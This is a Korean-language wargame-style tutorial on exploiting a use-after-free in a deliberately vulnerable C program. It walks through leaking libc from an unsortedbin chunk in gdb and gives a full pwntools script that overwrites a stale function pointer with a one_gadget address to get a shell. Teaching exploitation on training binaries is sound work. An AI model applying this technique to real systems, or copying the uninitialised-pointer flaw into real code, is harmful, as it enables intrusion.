# Exploit Tech: Use After Free

# 들어가며

## 서론

---

Use After Free 취약점을 이용하여 익스플로잇해보자.

### uaf_overwrite

```c
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}
int main() {
  int idx;
  char *ptr;
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}
```

## 실습 환경 Dockerfile

---

이전에 세팅한 환경에서 하면된다.

# 분석 및 설계

## 분석

---

### 보호 기법

```c
$ checksec uaf_overwrite
[*] '/home/dreamhack/uaf_overwrite'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

주어진 바이너리에 모든 보호 기법이 적용되어 있다. Full RELRO 보호 기법으로 인해 GOT를 덮는 공격은 어렵다. 이럴 때는 라이브러리에 존재하는 훅 또는 코드에서 사용하는 함수 포인터를 덮는 방법을 생각해볼 수 있다.

### 코드 분석

```c
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}

int main() {
  int idx;
  char *ptr;
  
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}
```

Human 구조체와 Robot 구조체는 같은 크기를 가지며 구조체를 할당하고 해제할 수 있다. 이때 Robot 구조체의 fptr은 초기화를 하지 않고 바로 사용하게 되므로 Use After Free가 발생할 수 있다.

Robot 구조체에서 fptr에 저장된 함수로 실행 흐름을 조작할 수 있다.

custom_func 함수의 경우도 메모리 영역을 초기화하지 않으므로 Use After Free가 발생할 수 있다.

## 익스플로잇 설계

---

Robot.fptr의 값을 원 가젯의 주소로 덮어서 셸을 획득할 수 있다. 이를 위해 libc가 매핑된 주소를 먼저 구해야한다.

### 1. 라이브러리 릭

ptmalloc2의 arena는 main_arena와 non-main arena가 있다.

- main_arena : libc에 전역 변수로 미리 정의돼 있다. 메인 스레드가 사용하고, brk로 힙을 확장한다.
- non-main arena : 멀티스레드에서 lock 경합 시 동적으로 mmap으로 할당된다. heap 영역이 아니라 mmap 영역에 위치한다.

이때 main_arena는 libc에 미리 정의되어 있는 전역 변수 구조체이므로, 이를 이용하면 libc가 매핑된 주소를 구할 수 있다. main_arena에 있는 bins에는 sentinel 노드가 있다. 만약 해제된 공간이 노드로 들어오면 sentitnel 노드와 원형 이중 연결 리스트를 이루게 된다. 따라서 Free chunk의 fd나 bk의 값을 읽으면 libc 영역의 특정 주소를 구할 수 있다.

이때 공간의 크기를 작게 잡으면 bins에 진입하기 힘들어지므로 공간의 크기를 크게 잡아서 unsortedbin으로 진입하게 하여 바로 bins로 접근할 수 있다.

또한, 공간을 하나만 할당하고 해제하게 되면 unsortedbin에 들어가는 것이 아닌 top chunk와 맞닿아 있으므로, 바로 공간이 하나로 병합된다. 이렇게 되면 unsortedbin을 이용할 수 없으므로 공간을 두개 할당한 뒤 처음 할당한 공간을 해제하여 top chunk와 맞닿지 않게 하여야 한다.

탑 청크와 맞닿지 않도록 0x510 크기의 청크를 두 개 생성하고, 처음 생성한 청크를 해제한 후, fd와 bk를 gdb로 확인해보자.

```c
$ export LD_PRELOAD=$(realpath ./libc-2.27.so)
$ gdb -q uaf_overwrite
pwndbg> r
Starting program: /home/dreamhack/uaf_overwrite
1. Human
2. Robot
3. Custom
> 3
Size: 1280
Data: a
Data: a

Free idx: -1
1. Human
2. Robot
3. Custom
> 3
Size: 1280
Data: b
Data: b

Free idx: 0
1. Human
2. Robot
3. Custom
>
```

첫 번째 청크의 크기를 1280(0x500) 만큼 할당을 요청한 후, 데이터에는 “a”를 입력한다. Free idx: 는 -1을 입력하여 아무것도 free()하지 않도록 만든다. 두 번째 청크도 똑같이 큰 공간을 할당하고, 이후 첫번째 할당했던 공간을 해제한다. heap 명령어로 청크들의 정보를 살펴보자.

```c
^C [Ctrl+C 로 인터럽트]
Program received signal SIGINT, Interrupt.
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x251

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555603250
Size: 0x511
fd: 0x7ffff7dcdca0
bk: 0x7ffff7dcdca0

Allocated chunk
Addr: 0x555555603760
Size: 0x510

Top chunk | PREV_INUSE
Addr: 0x555555603c70
Size: 0x20391
pwndbg> x/10gx 0x555555603250
0x555555603250: 0x0000000000000000  0x0000000000000511
0x555555603260: 0x00007ffff7dcdca0  0x00007ffff7dcdca0
0x555555603270: 0x0000000000000000  0x0000000000000000
0x555555603280: 0x0000000000000000  0x0000000000000000
0x555555603290: 0x0000000000000000  0x0000000000000000
pwndbg>
```

Free chunk를 살펴보면 fd와 bk가 0x7ffff7dcdca0로 같은 것을 볼 수 있다. 이는 원형 이중 연결 리스트 구조이기 때문에 같은 sentinel 노드를 가리키고 있어서 그렇다. vmmap으로 살펴보면 0x7ffff7dcdca0는 libc에 존재하는 주소임을 확인할 수 있다.

```c
pwndbg> vmmap 0x7ffff7dcdca0
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /home/dreamhack/libc-2.27.so +0xca0
```

libc가 매핑된 주소를 vmmap으로 구해 오프셋을 구할 수 있다.

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555400000     0x555555402000 r-xp     2000      0 /home/dreamhack/uaf_overwrite
    0x555555601000     0x555555602000 r--p     1000   1000 /home/dreamhack/uaf_overwrite
    0x555555602000     0x555555603000 rw-p     1000   2000 /home/dreamhack/uaf_overwrite
    0x555555603000     0x555555624000 rw-p    21000      0 [heap]
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000      0 /home/dreamhack/libc-2.27.so
    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /home/dreamhack/libc-2.27.so
    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /home/dreamhack/libc-2.27.so
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /home/dreamhack/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000      0 [anon_7ffff7dcf]
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000      0 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ff4000     0x7ffff7ff6000 rw-p     2000      0 [anon_7ffff7ff4]
    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000      0 [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000      0 [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  29000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2a000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

libc 즉, /home/dreamhack/libc-2.27.so 파일이 매핑된 베이스 주소는 0x7ffff79e2000이다. 이전에 구한 주소 값에서 libc가 매핑된 주소를 빼면 오프셋을 구할 수 있다.

 

```c
pwndbg> p/x 0x7ffff7dcdca0 - 0x7ffff79e2000
$1 = 0x3ebca0
```

### 2. 함수 포인터 덮어쓰기

Human과 Robot은 같은 크기를 가지고 malloc을 통해서 할당되므로 Human.age에 원가젯 주소를 입력하고, robot_func를 실행하면 fptr 위치에 남아있는 원가젯을 호출할 수 있다.

# 익스플로잇

## 라이브러리 릭

---

앞에서 설명한 방식으로 라이브러리의 base 주소를 구해보자.

이때 uaf_overwrite 문제의 libc library 주소 leak은 온전한 값이 전달되는 것이 아닌 이용자의 값이 해당 주소 일부 하위 바이트를 덮어쓴 상태에서 출력되므로, 다른 일반적인 문제와 libc 베이스 주소를 계산하기 위한 오프셋을 구하는 방법이 조금 다를 수 있다.

```c
#!/usr/bin/env python3
# Name: uaf_overwrite.py
from pwn import *

p = process('./uaf_overwrite')

def slog(sym, val): success(sym + ': ' + hex(val))

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())

# UAF to calculate the `libc_base`
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)
custom(0x500, b'B', -1) # data 값이 'B'가 아니라 'C'가 된다면, offset은 0x3ebc42 가 아니라 0x3ebc43이 됩니다.

lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c # 제약 조건을 만족하는 원가젯 주소 계산

slog('libc_base', lb)
slog('one_gadget', og)
```

0x500을 malloc하게 되면 unsortedbin에 있던 청크가 재할당된다. 이때 값이 써지는 부분은 우리가 leak하기를 원했던 fd 부분이다. 따라서 위에서 B를 값으로 넣었으므로 리틀엔디안에서 fd의 하위 1바이트는 B로 값이 써진다.

```c
원래 fd: 90 78 bc 3e xx 7f 00 00  (libc 주소, 리틀 엔디안)
입력 후: 42 78 bc 3e xx 7f 00 00  (첫 바이트만 'B'로 덮임)
```

따라서 위의 주석에서 본 것과 같이 C로 넣었다면 offset이 1늘어나게된다. 

## 함수 포인터 덮어쓰기

---

human → age와 robot → fptr이 같은 위치에 있으므로 robot → fptr을 원하는 값으로 조작할 수 있다.

```c
#!/usr/bin/env python3
# Name: uaf_overwrite.py
from pwn import *

p = process('./uaf_overwrite')

def slog(sym, val): success(sym + ': ' + hex(val))

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())

# UAF to calculate the `libc_base`
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)
custom(0x500, b'B', -1) # data 값이 'B'가 아니라 'C'가 된다면, offset은 0x3ebc42 가 아니라 0x3ebc43이 됩니다.

lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c # 제약 조건을 만족하는 원 가젯 주소 계산

slog('libc_base', lb)
slog('one_gadget', og)

# UAF to manipulate `robot->fptr` & get shell
human(1, og)
robot(1)

p.interactive()
```